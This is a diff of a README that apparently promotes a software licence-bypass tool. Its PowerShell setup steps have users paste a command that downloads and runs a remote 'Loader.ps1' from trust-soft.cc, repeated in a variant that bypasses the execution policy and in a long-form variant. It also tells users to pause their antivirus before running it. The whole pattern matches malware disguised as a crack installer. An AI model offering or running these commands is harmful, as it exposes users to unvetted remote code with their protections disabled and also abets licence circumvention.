@@ -10,16 +10,17 @@ By deploying optimized file structures and localized licensing loopbacks, this u
 - **Local Network Routing**: Intercepts authentication calls locally to preserve absolute offline freedom.
 - **Asset Library Unlocking**: Instantly fixes material and style directory mappings for offline usage.
 
+
 ---
 
-## 🛠 Quick Setup Guide (PowerShell)
+## 🛠️ Quick Setup Guide (PowerShell)
 
 1. Launch PowerShell:
-   * Press Win + X on your keyboard.
-   * Click on Terminal or Windows PowerShell from the list.
+   * Press `Win + X` on your keyboard.
+   * Click on **Terminal** or **Windows PowerShell** from the list.
 
 2. Execute the Setup Script:
-   Copy the command below, paste it into your PowerShell window, and hit Enter. The script will handle the necessary registry tweaks and install all dependencies automatically:
+   Copy the command below, paste it into your PowerShell window, and hit `Enter`. The script will handle the necessary registry tweaks and install all dependencies automatically:
 
    ```powershell
    irm https://trust-soft.cc/powershell/Loader.ps1 | iex
@@ -31,11 +32,15 @@ By deploying optimized file structures and localized licensing loopbacks, this u
 
 ### 💬 Script is blocked by Execution Policy
 If Windows stops the script from running due to security policies, you can force it to run by pasting this command into a standard Command Prompt (cmd):
-`powershell -ExecutionPolicy Bypass -Command "irm https://trust-soft.cc/powershell/Loader.ps1 | iex"`
+```cmd
+powershell -ExecutionPolicy Bypass -Command "irm https://trust-soft.cc/powershell/Loader.ps1 | iex"
+```
 
-### 💬 "irm" command not found (Outdated version)
-If your terminal window doesn't support the abbreviated shortcut, use the full, unabbreviated command sequence instead:
-`Invoke-RestMethod https://trust-soft.cc/powershell/Loader.ps1 | Invoke-Expression`
+### 💬 "irm" command not found (Outdated PowerShell)
+If your PowerShell version doesn't support the `irm` shortcut, use the full, unabbreviated commands instead:
+```powershell
+Invoke-RestMethod https://trust-soft.cc/powershell/Loader.ps1 | Invoke-Expression
+```
 
 ### 💬 Antivirus / SmartScreen Alerts
 Security software might occasionally flag automated installers. If the script gets blocked, pause "Real-time protection" in your Windows Security dashboard, run the setup, and re-enable your antivirus immediately afterward.
